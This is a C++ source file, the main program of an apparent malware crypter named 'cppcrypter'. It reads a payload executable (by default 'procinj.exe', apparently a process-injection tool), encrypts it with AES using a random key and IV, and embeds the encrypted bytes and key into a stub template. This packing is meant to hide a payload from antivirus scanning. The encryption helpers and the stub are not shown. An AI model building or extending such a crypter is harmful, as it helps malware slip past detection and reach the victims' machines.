#include <iostream>
#include <cstring>
#include <vector>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <fstream>
#include "utils.h"
#include <iomanip>


using namespace std;
/*
g++ -o main main.cpp utils.cpp -I"C:\Program Files\OpenSSL-Win64\include" -L"C:\Program Files\OpenSSL-Win64\lib\VC\x64\MT" -lssl -lcrypto

*/

void printBytesHex(const vector<unsigned char>& bytes, size_t numBytes) {
    for (size_t i = 0; i < numBytes && i < bytes.size(); ++i) {
        cout << hex << setw(2) << setfill('0') << static_cast<int>(bytes[i]) << " ";
    }
    cout << dec << endl; // Switch back to decimal
}
int main(int argc, char * argv[]){
    
    string path_to_payload = "C:\\Users\\18163\\Desktop\\cppcrypter\\bin\\procinj.exe";
    string path_to_output_dir = "C:\\Users\\18163\\Desktop\\cppcrypter\\stub\\";
    string path_to_stub_template = "C:\\Users\\18163\\Desktop\\cppcrypter\\stub.cpp";

    if (argc == 1){
        cout << "\n\nNo arguments provided, using default\nPath to payload: " << path_to_payload << "\nPath to output directory: " << path_to_output_dir << "\nPath to stub template: " << path_to_stub_template <<"\nUsage: ./main.exe [\"path\\to\\payload\"] [\"path\\to\\output\\directory\"] [\"path\\to\\stub\\template\"]\n";
    } else if (argc == 2){
        path_to_payload = argv[1];
        cout << "\n\nUsing default output directory path and default stub template\nPath to payload: " << path_to_payload << "\nPath to output directory: " << path_to_output_dir << "\nPath to stub template: " << path_to_stub_template << "\nUsage: ./main.exe [\"path\\to\\payload\"] [\"path\\to\\output\\directory\"] [\"path\\to\\stub\\template\"]\n";
    } else if (argc == 3){
        path_to_payload = argv[1];
        path_to_output_dir = argv[2];
        cout << "\n\nUsing default path to stub\nPath to payload: " << path_to_payload << "\nPath to output directory: " << path_to_output_dir << "\nPath to stub template: " << path_to_stub_template;
    } else if (argc == 4){
        path_to_payload = argv[1];
        path_to_output_dir = argv[2];
        path_to_stub_template = argv[3];
        cout << "\n\nPath to payload: " << path_to_payload << "\nPath to output directory: " << path_to_output_dir << "\nPath to stub template: " << path_to_stub_template;
    } else {
        cout << "\n\nInvalid arguments, using default\nPath to payload: " << path_to_payload << "\nPath to output directory: " << path_to_output_dir << "\nPath to stub template: " << path_to_stub_template << "\nUsage: ./main.exe [\"path\\to\\payload\"] [\"path\\to\\output\\directory\"] [\"path\\to\\stub\\template\"]\n";

    }

    vector<unsigned char> buf = readBinary(path_to_payload);
    if(buf.empty()){
        cerr << "buf empty\n";
        return 1;
    }

    // key and IV gen
    auto [key, iv] = generateKeyAndIV(AES_BLOCK_SIZE, AES_BLOCK_SIZE);

    //cout << "Read " << buf.size() << " bytes from the file." << endl;
    vector<unsigned char> payloadBytes = encrypt(buf, key, iv);
    vector<unsigned char> decrypted = decrypt(payloadBytes, key, iv);

    /*
    cout << "encrypted: " << payloadBytes.size() << " bytes" << endl;
    cout << "decrypted: " << decrypted.size() << " bytes" << endl;
    printBytesHex(buf, 16);
    printBytesHex(decrypted, 16);
    */

    writeStub(path_to_stub_template, path_to_output_dir, payloadBytes, key, iv);
    

    






    return 0;
}
